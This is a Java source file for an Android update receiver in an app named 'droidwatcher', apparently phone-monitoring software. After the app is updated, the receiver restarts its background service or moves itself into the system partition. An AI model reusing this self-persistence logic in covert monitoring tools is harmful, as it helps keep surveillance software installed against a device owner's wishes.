package com.droidwatcher.receivers;

import com.droidwatcher.Debug;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.modules.CommandsModule;
import com.droidwatcher.modules.UpdateModule;
import com.droidwatcher.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class UpdateBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		
		if (action == null) {
			return;
		}
		
		Debug.i(action);
		
		if (action.equals(UpdateModule.ACTION_UPDATE)) {
			UpdateModule.message(UpdateModule.START_UPDATE);
			return;
		}
		
		if (action.equals(Intent.ACTION_PACKAGE_REPLACED)) {
			Uri data = intent.getData();
			if (data == null) {
				return;
			}
			
			String ssp = data.getSchemeSpecificPart();
			if (ssp == null) {
				return;
			}
			
			if (ssp.equals("com.droidwatcher")) {
				if (AppService.isSystemApp(context)) {
					CommandsModule.moveToSystem(context);
				} else {
					if (new SettingsManager(context).isConnected()) {
						context.startService(new Intent(context.getApplicationContext(), AppService.class));
					}
				}
			}
		}
		
	}

}
